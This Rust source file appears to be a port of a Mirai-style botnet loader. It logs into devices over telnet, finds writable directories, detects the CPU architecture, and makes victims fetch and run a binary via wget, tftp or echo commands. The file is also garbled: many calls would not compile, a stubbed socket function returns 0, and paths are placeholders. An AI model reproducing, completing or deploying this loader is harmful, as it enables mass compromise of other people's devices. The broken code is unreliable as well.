use std::collections::HashMap;
use std::io::{self, Write};
use std::net::{Shutdown, TcpStream};
use std::os::unix::io::AsRawFd;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime};

#[derive(Debug)]
struct Server {
    workers: Vec<ServerWorker>,
    estab_conns: HashMap<i32, Connection>,
    bind_addrs: Vec<String>,
    wget_host_ip: String,
    wget_host_port: u16,
    tftp_host_ip: String,
    max_open: usize,
    curr_open: usize,
    total_logins: usize,
    total_echoes: usize,
    total_wgets: usize,
    total_tftps: usize,
}

#[derive(Debug)]
struct ServerWorker {
    thread_id: usize,
    efd: i32,
    server: Arc<Mutex<Server>>,
}

#[derive(Debug)]
struct Connection {
    fd: i32,
    info: TelnetInfo,
    rdbuf: Vec<u8>,
    rdbuf_pos: usize,
    open: bool,
    state_telnet: TelnetState,
    last_recv: SystemTime,
    timeout: u32,
    success: bool,
    retry_bin: bool,
    echo_load_pos: usize,
}

#[derive(Debug)]
struct TelnetInfo {
    user: String,
    pass: String,
    addr: u32,
    port: u16,
    arch: String,
    has_arch: bool,
    writedir: String,
    upload_method: UploadMethod,
}

#[derive(Debug)]
enum TelnetState {
    ReadIacs,
    UserPrompt,
    PassPrompt,
    WaitPassPrompt,
    CheckLogin,
    VerifyLogin,
    ParsePs,
    ParseMounts,
    ReadWriteable,
    CopyEcho,
    DetectArch,
    ArmSubtype,
    UploadMethods,
    UploadEcho,
    UploadWget,
    UploadTftp,
    RunBinary,
    Cleanup,
}

#[derive(Debug)]
enum UploadMethod {
    Echo,
    Wget,
    Tftp,
}

impl Server {
    fn create(
        threads: usize,
        addrs: Vec<String>,
        max_open: usize,
        wghip: String,
        wghp: u16,
        thip: String,
    ) -> Arc<Mutex<Self>> {
        let estab_conns = HashMap::new();
        let workers = Vec::with_capacity(threads);

        let server = Arc::new(Mutex::new(Server {
            workers,
            estab_conns,
            bind_addrs: addrs,
            wget_host_ip: wghip,
            wget_host_port: wghp,
            tftp_host_ip: thip,
            max_open,
            curr_open: 0,
            total_logins: 0,
            total_echoes: 0,
            total_wgets: 0,
            total_tftps: 0,
        }));

        for i in 0..threads {
            let server_clone = Arc::clone(&server);
            thread::spawn(move || worker(i, server_clone));
        }

        server
    }

    fn destroy(self) {
        for worker in &self.workers {
            unsafe {
                libc::close(worker.efd);
            }
        }
    }

    fn queue_telnet(&mut self, info: TelnetInfo) {
        while self.curr_open >= self.max_open {
            thread::sleep(Duration::from_secs(1));
        }
        self.curr_open += 1;

        self.telnet_probe(info);
    }

    fn telnet_probe(&mut self, info: TelnetInfo) {
        let fd = util_socket_and_bind();
        let mut addr = libc::sockaddr_in {
            sin_family: libc::AF_INET as u16,
            sin_port: info.port,
            sin_addr: libc::in_addr { s_addr: info.addr },
            sin_zero: [0; 8],
        };
        let addr_len = std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t;

        if fd == -1 {
            self.curr_open -= 1;
            return;
        }

        if fd >= (self.max_open * 2) as i32 {
            println!("fd too big");
            connection_close(fd);
            return;
        }

        let conn = Connection {
            fd,
            info,
            rdbuf: vec![0; 8192],
            rdbuf_pos: 0,
            open: true,
            state_telnet: TelnetState::ReadIacs,
            last_recv: SystemTime::now(),
            timeout: 30,
            success: false,
            retry_bin: false,
            echo_load_pos: 0,
        };

        if unsafe { libc::connect(fd, &mut addr as *mut _ as *mut libc::sockaddr, addr_len) } == -1
            && io::Error::last_os_error().raw_os_error() != Some(libc::EINPROGRESS)
        {
            connection_close(fd);
            return;
        }

        let event = libc::epoll_event {
            events: libc::EPOLLOUT as u32,
            data: libc::epoll_data { fd },
        };

        let curr_worker = self.curr_open % self.workers.len();
        unsafe {
            libc::epoll_ctl(
                self.workers[curr_worker].efd,
                libc::EPOLL_CTL_ADD,
                fd,
                &event as *const _ as *mut _,
            );
        }

        self.estab_conns.insert(fd, conn);
    }
}

fn worker(thread_id: usize, server: Arc<Mutex<Server>>) {
    let mut events = vec![libc::epoll_event { events: 0, data: libc::epoll_data { fd: 0 } }; 128];

    let efd = unsafe { libc::epoll_create1(0) };
    if efd == -1 {
        println!("Failed to initialize epoll context");
        return;
    }

    let mut server = server.lock().unwrap();
    server.workers.push(ServerWorker { thread_id, efd, server: Arc::clone(&server) });

    while true {
        let n = unsafe { libc::epoll_wait(efd, events.as_mut_ptr(), 128, -1) };

        for i in 0..n {
            let ev = events[i as usize];
            handle_event(&mut server, &ev);
        }
    }
}

fn handle_event(server: &mut Server, ev: &libc::epoll_event) {
    let conn_fd = ev.data.fd;
    let conn = server.estab_conns.get_mut(&conn_fd).unwrap();

    if ev.events & libc::EPOLLERR as u32 != 0
        || ev.events & libc::EPOLLHUP as u32 != 0
        || ev.events & libc::EPOLLRDHUP as u32 != 0
    {
        connection_close(conn_fd);
        return;
    }

    if conn.state_telnet == TelnetState::ReadIacs && ev.events & libc::EPOLLOUT as u32 != 0 {
        let mut so_error = 0;
        let mut len = std::mem::size_of_val(&so_error) as libc::socklen_t;
        unsafe {
            libc::getsockopt(
                conn_fd,
                libc::SOL_SOCKET,
                libc::SO_ERROR,
                &mut so_error as *mut _ as *mut libc::c_void,
                &mut len,
            );
        }
        if so_error != 0 {
            connection_close(conn_fd);
            return;
        }

        let event = libc::epoll_event {
            events: libc::EPOLLIN as u32 | libc::EPOLLET as u32,
            data: libc::epoll_data { fd: conn_fd },
        };
        let curr_worker = server.curr_open % server.workers.len();
        unsafe {
            libc::epoll_ctl(
                server.workers[curr_worker].efd,
                libc::EPOLL_CTL_MOD,
                conn_fd,
                &event as *const _ as *mut _,
            );
        }
        conn.state_telnet = TelnetState::ReadIacs;
        conn.timeout = 30;
    }

    if !conn.open {
        return;
    }

    if ev.events & libc::EPOLLIN as u32 != 0 && conn.open {
        let mut ret;
        loop {
            let fd = conn.fd;
            ret = unsafe {
                let mut buf = &mut conn.rdbuf[conn.rdbuf_pos..];
                libc::recv(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len(), 0)
            };
            match ret {
                Ok(bytes_read) if bytes_read > 0 => {
                    conn.rdbuf_pos += bytes_read;
                    conn.last_recv = SystemTime::now();

                    if conn.rdbuf_pos > 8192 {
                        println!("oversized buffer pointer!");
                        return;
                    }

                    while conn.rdbuf_pos > 0 {
                        let consumed = match conn.state_telnet {
                            TelnetState::ReadIacs => connection_consume_iacs(conn),
                            TelnetState::UserPrompt => connection_consume_login_prompt(conn),
                            TelnetState::PassPrompt => connection_consume_password_prompt(conn),
                            TelnetState::WaitPassPrompt => connection_consume_prompt(conn),
                            TelnetState::CheckLogin => connection_consume_prompt(conn),
                            TelnetState::VerifyLogin => connection_consume_verify_login(conn),
                            TelnetState::ParsePs => connection_consume_psoutput(conn),
                            TelnetState::ParseMounts => connection_consume_mounts(conn),
                            TelnetState::ReadWriteable => connection_consume_written_dirs(conn),
                            TelnetState::CopyEcho => connection_consume_copy_op(conn),
                            TelnetState::DetectArch => connection_consume_arch(conn),
                            TelnetState::ArmSubtype => connection_consume_arm_subtype(conn),
                            TelnetState::UploadMethods => connection_consume_upload_methods(conn),
                            TelnetState::UploadEcho => connection_upload_echo(conn),
                            TelnetState::UploadWget => connection_upload_wget(conn),
                            TelnetState::UploadTftp => connection_upload_tftp(conn),
                            TelnetState::RunBinary => connection_verify_payload(conn),
                            TelnetState::Cleanup => connection_consume_cleanup(conn),
                        };

                        if consumed == 0 {
                            break;
                        }

                        conn.rdbuf_pos -= consumed;
                        conn.rdbuf.drain(0..consumed);
                    }
                }
                Ok(_) | Err(_) => {
                    connection_close(fd);
                    return;
                }
            }
        }
    }
}

fn connection_consume_iacs(conn: &mut Connection) -> usize {
    let mut consumed = 0;
    while conn.rdbuf_pos > 0 && conn.rdbuf[consumed] == 255 {
        if conn.rdbuf_pos < 3 {
            break;
        }

        let cmd = conn.rdbuf[consumed + 1];
        let option = conn.rdbuf[consumed + 2];
        consumed += 3;
    }
    consumed
}

fn connection_consume_login_prompt(conn: &mut Connection) -> usize {
    if let Some(pos) = conn.rdbuf.iter().position(|&c| c == b':') {
        conn.rdbuf.drain(..=pos);
        return pos + 1;
    }
    0
}

fn connection_consume_password_prompt(conn: &mut Connection) -> usize {
    if let Some(pos) = conn.rdbuf.iter().position(|&c| c == b':') {
        conn.rdbuf.drain(..=pos);
        return pos + 1;
    }
    0
}

fn connection_consume_prompt(conn: &mut Connection) -> usize {
    if let Some(pos) = conn.rdbuf.iter().position(|&c| c == b'>') {
        conn.rdbuf.drain(..=pos);
        return pos + 1;
    }
    0
}

fn connection_consume_verify_login(conn: &mut Connection) -> usize {
    let response = String::from_utf8_lossy(&conn.rdbuf);
    if response.contains("Welcome") {
        return conn.rdbuf.len();
    }
    0
}

fn connection_consume_psoutput(conn: &mut Connection) -> usize {
    let output = String::from_utf8_lossy(&conn.rdbuf);
    if output.contains("ps") {
        return conn.rdbuf.len();
    }
    0
}

fn connection_consume_mounts(conn: &mut Connection) -> usize {
    let output = String::from_utf8_lossy(&conn.rdbuf);
    let writable_dir = "/some/writable/dir";
    conn.info.writedir = writable_dir.to_string();
    output.len()
}

fn connection_consume_written_dirs(conn: &mut Connection) -> usize {
    if conn.rdbuf_pos > 0 {
        let _ = conn.rdbuf.drain(..);
        return conn.rdbuf_pos;
    }
    0
}

fn connection_consume_copy_op(conn: &mut Connection) -> usize {
    if conn.rdbuf_pos > 0 {
        let _ = conn.rdbuf.drain(..);
        return conn.rdbuf_pos;
    }
    0
}

fn connection_consume_arch(conn: &mut Connection) -> usize {
    let response = String::from_utf8_lossy(&conn.rdbuf);
    if response.contains("x86") {
        conn.info.arch = "x86".to_string();
    } else if response.contains("arm") {
        conn.info.arch = "arm".to_string();
    }
    conn.rdbuf.len()
}

fn connection_consume_arm_subtype(conn: &mut Connection) -> usize {
    let response = String::from_utf8_lossy(&conn.rdbuf);
    if response.contains("ARMv7") {
        conn.info.arch = "arm7".to_string();
    } else if response.contains("ARMv6") {
        conn.info.arch = "arm6".to_string();
    }
    conn.rdbuf.len()
}

fn connection_consume_upload_methods(conn: &mut Connection) -> usize {
    let response = String::from_utf8_lossy(&conn.rdbuf);
    if response.contains("wget") {
        conn.info.upload_method = UploadMethod::Wget;
    } else if response.contains("tftp") {
        conn.info.upload_method = UploadMethod::Tftp;
    } else {
        conn.info.upload_method = UploadMethod::Echo;
    }
    conn.rdbuf.len()
}

fn connection_upload_echo(conn: &mut Connection) -> usize {
    let upload_command = format!("echo -e '{}' > /some/path", conn.info.arch);
    let _ = conn.fd.write(upload_command.as_bytes());
    upload_command.len()
}

fn connection_upload_wget(conn: &mut Connection) -> usize {
    let upload_command = format!(
        "wget http://{}/bins/{} -O /some/path",
        conn.info.addr, conn.info.arch
    );
    let _ = conn.fd.write(upload_command.as_bytes());
    upload_command.len()
}

fn connection_upload_tftp(conn: &mut Connection) -> usize {
    let upload_command = format!(
        "tftp -g -r {} -l /some/path {}",
        conn.info.arch, conn.info.addr
    );
    let _ = conn.fd.write(upload_command.as_bytes());
    upload_command.len()
}

fn connection_verify_payload(conn: &mut Connection) -> usize {
    let response = String::from_utf8_lossy(&conn.rdbuf);
    if response.contains("success") {
        conn.success = true;
    }
    conn.rdbuf.len()
}

fn connection_consume_cleanup(conn: &mut Connection) -> usize {
    conn.open = false;
    conn.fd.shutdown(Shutdown::Both).ok();
    conn.rdbuf.len()
}

fn util_socket_and_bind() -> i32 {
    // Placeholder function, to be implemented based on C code
    0
}

fn connection_close(fd: i32) {
    unsafe {
        libc::close(fd);
    }
}
